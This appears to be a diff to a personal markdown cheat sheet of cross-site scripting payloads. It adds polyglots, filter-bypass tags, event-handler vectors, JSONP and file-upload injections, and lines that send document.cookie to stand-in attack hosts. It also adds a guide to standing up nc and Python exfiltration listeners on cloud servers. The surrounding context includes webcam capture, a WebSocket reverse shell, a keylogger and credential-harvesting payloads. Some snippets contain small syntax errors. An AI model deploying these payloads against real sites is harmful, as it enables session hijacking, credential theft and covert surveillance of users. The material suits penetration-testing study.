@@ -5,6 +5,17 @@ Cross Site Scripting {XSS}
 
 + An exhaustive list of XSS test payloads can be found under `~/scripts/xss_complete.txt`   
 
+## Polyglots
+
+```
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
+
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+```
+
 ## Basic Payloads
 
 `<script SRC=http://attacker.domain.com/payload.js></script>`
@@ -17,13 +28,33 @@ Cross Site Scripting {XSS}
 
 ## Filter Bypass Payloads
 
-### No Quotes && Semicolon
+### Script Tag Filtering
 
-`<IMG SRC=javascript:alert('XSS')>`
+`<SCRiP/**/t><ScRIpT>alert(1)<ScRiP/**/t></ScRip/**/T>`
+
+`<scr<script>ipt>alert(1)</scr<script>ipt>`
+
+### Recursive Script Tag Stripping
+
+`<SCR<SCRIPTIPT>alert(1)</SCRIPT>`
+
+`<SCR<SCR<SCRIPTIPT>IPT>alert(1)<</SCRIPT>/SCRIPT>`
+
+### Script Content Filtering
+
+`<SCRIPT>window.location=atob(base64StringOfAttackSVR)</SCRIPT>`
 
 ### Case Filtering
 
 `<IMG SRC=JaVaScRiPt:alert('XSS')>`
+
+### Edgecase Filtering
+
+`<<script<sscript+SRC="http://attacker.domain/alert.js"></script>`
+
+### No Quotes && Semicolon
+
+`<IMG SRC=javascript:alert('XSS')>`
 
 ### HTML Entities
 
@@ -53,6 +84,38 @@ Cross Site Scripting {XSS}
 `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`
 
 
+## DOM Event Based Payloads
+
+### Onload
+
+`<img onLoad="javascript:alert(1)">`
+
+`<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>`
+
+`<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>`
+
+### Onerror
+
+`<img src=1 href=1 onerror="javascript:alert(1)"></img>`
+
+`<body src=1 href=1 onerror="javascript:alert(1)"></body>`
+
+`<script src=1 href=1 onerror="javascript:alert(1)"></script>`
+
+### Onblur
+
+`<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>`
+
+`<input onblur=javascript:alert(1) autofocus><input autofocus>`
+
+### Onkeydown
+
+`<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>`
+
+### Onfocus
+
+`<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>`
+
 ## Encoded Payloads
 
 
@@ -78,16 +141,50 @@ Cross Site Scripting {XSS}
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 ```
 
+## JSONP Payloads
 
-## Polyglots
++ JSONP callbacks can be weaponised in certain cercimstances to get XSS
++ JSONP based XSS vectors also have a high chance of negating CSP protections making them an exeptionally useful vulnerability
++ Note: the following payloads are designed to be injected into anypart of a web application which uses a JSONP endpoint, they can  
+ also be injected into the callback of a legitimate JSONP query
+	+ For example: `domain.com/page?query=PAYLOAD`
+
+### Basic JSONP Payloads
+
+`<script src="https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);"></script>`
+
+## Image/File Upload Based Payloads
+
+### File Name
+
+`""><img src=x onerror=alert(1)>.gif`
+
+### SVG 
 
 ```
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<?xml version="1.0" standalone="no"?>
+<svg width="1056" height="816" xmlns="http://www.w3.org/2000/svg" onload="alert(1)" id="svgvm7">
+<g transform="translate(5,5)" style="font-family: sans-serif;"><g><g transform="translate(0, 0)">
 ```
 
+### CSV
+
 ```
-jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>”
 ```
+
+### File Metadata
+
++ Note: These can be embeded with exiftool and hence include the command for each 
+
+`“><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg`
+
++ `$ exiftool -Artist='PAYLOAD'`
+
+### GIF
+
+`GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;`
+
 
 # Exploit Payloads
 
@@ -99,17 +196,37 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 window.location='https://attackersphishingsite.com'
 ```
 
-## Grab Auth Cookie
+## Exfiltrate Auth Tokens/Cookies
 
-~ Requires attack server
+~ Requires attack server ~
 
 ```
 fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
 ```
 
+```
+window.location = "http://attack.svr?stolen_token=" + document.cookie;
+```
+
+```
+window['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
+```
+
+```
+document.location = "http://attack.svr?stolen_token=" + document.cookie";
+```
+
+```
+document['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
+```
+
+```
+let req = new XMLHttpRequest();res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);req.send();
+```
+
 ## Grab Protected Pages
 
-~ Requires attack server
+~ Requires attack server ~
 
 ```
 fetch('/protected_page')
@@ -181,7 +298,8 @@ document.body.appendChild(frame)
 
 ## Capture Data From Webcam
 
-~ Requires attack server
+~ Requires attack server~
+
 ```
 vid_element = document.createElement('video')
 navigator.mediaDevices.getUserMedia({video:true})
@@ -200,12 +318,12 @@ navigator.mediaDevices.getUserMedia({video:true})
 					body: JSON.stringify({img: canvas.toDataURL()})
 				})
 		}, 2000)
-	})
+	});
 ```
 
 ## Reverse Shell
 
-~ Requires attack server/listner
+~ Requires attack server/listner ~
 
 ```
 sock = new WebSocket('wss://attack.domain.com')
@@ -224,7 +342,7 @@ document.addEventListener('change', element => {
 				headers: { 'Content-Type:' 'application/json' },
 				body: JSON.stringify({key: element.target.value})
 			})
-	})
+	});
 ```
 
 ## Steal Saved Browser Credentails
@@ -244,10 +362,101 @@ form.appendChild(password)
 document.body.appendChild(form)
 document.addEventListner('click', () =>
 	fetch(`attack.domain.com?usr=${usr_name.value}pass=${password.value}`)
-)
+);
 ```
 
-# Identifying/Detection
+# Exfiltration Servers/Listners
+
++ This section aims to document several approaches to setting up an attack server for XSS exfiltration 
+
+### [AWS EC2 Instance](https://us-east-2.console.aws.amazon.com/ec2/)
+
++ Amazons EC2 instances are my personal go to
+
+#### Pros
+
++ Free under a certain threshold which is more than adequate for an exfiltration server
+	+ 30 GB disk
+	+ 1 CPU
++ Public IPv4 address 
++ Possible to configure a IPv6 address also
++ Fast to connect, little machine configuration required
+	+ Can all be done through managment console
+
+#### Cons
+
++ HTTPs server configuration is more fiddly
++ Listners need to be setup manually
+
+
+#### Usage
+
++ Spin up a linux instance (Ubutu, Fedora, etc)
++ Follow connect tab instructions (Connect > ssh key.pem)
++ Start listner
+
+##### NC
+
+`$ nc -l port`
+
+`$ netcat -l port`
+
+##### Python Simple HTTP
+
+`$ python -m http.server port`
+     
+
+### [Pipedream.com](https://pipedream.com)
+
++ Another personal favorite
+
+#### Pros
+
++ Nearly zero setup, just make an account and start a webhook
++ Free for anyone
++ Clean UI
++ No configuration for HTTP or HTTPs
+
+#### Cons
+
++ Not as flexiable as a server
+
+### [Digital Ocean Droplets](https://cloud.digitalocean.com/droplets) 
+
+#### Pros
+
++ Get $100 credit for free as a student
++ Lowest teir machine is more than adequate
++ Simple setup
++ Public IPv4 and IPv6 
+
+#### Cons
+
++ $5 per month for lowest teir is steep
+
+#### Usage
+
++ Spin up a linux droplet (Ubutu, Fedora, etc)
++ Ssh to droplets public IP
++ Start listner
+
+##### NC
+
+`$ nc -l port`
+
+`$ netcat -l port`
+
+##### Python Simple HTTP
+
+`$ python -m http.server port`
+     
+
+
+# Tips && Tricks
+
+## Coming soon
+
+# Finding && Exploiting XSS
 
 ## Identification Checklist
 
